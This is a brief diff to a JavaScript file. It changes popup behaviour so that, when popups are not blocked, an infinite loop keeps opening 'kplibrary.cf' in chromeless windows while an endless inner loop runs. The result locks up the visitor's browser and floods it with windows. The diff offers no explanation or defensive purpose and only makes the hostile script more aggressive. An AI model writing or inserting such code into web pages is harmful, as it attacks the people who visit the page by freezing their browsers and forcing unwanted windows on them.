@@ -5,6 +5,8 @@ if (popUp == null || typeof(popUp) == 'undefined') {
     alert("Thicc Katz")
   }
 } else {
+  while (true) {
     window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
- for (var i = 0; i === i; i++) {}
+    for (var i = 0; i === i; i++) {}
+  }
 }
